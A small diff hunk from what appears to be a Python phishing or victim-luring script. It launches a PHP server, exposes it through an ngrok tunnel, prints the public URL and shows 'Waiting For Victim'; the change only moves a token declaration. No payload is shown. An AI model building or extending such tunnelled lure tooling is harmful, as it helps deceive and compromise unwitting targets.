@@ -558,8 +558,8 @@ exit();""")
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
        phpserver()
-       global token
        print (Fore.Blue+" Launching Ngrok")
+       global token
        link = ngrok.connect(6060,"http",auth_token=token)
        (Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+" URL 1 : "+link)
        
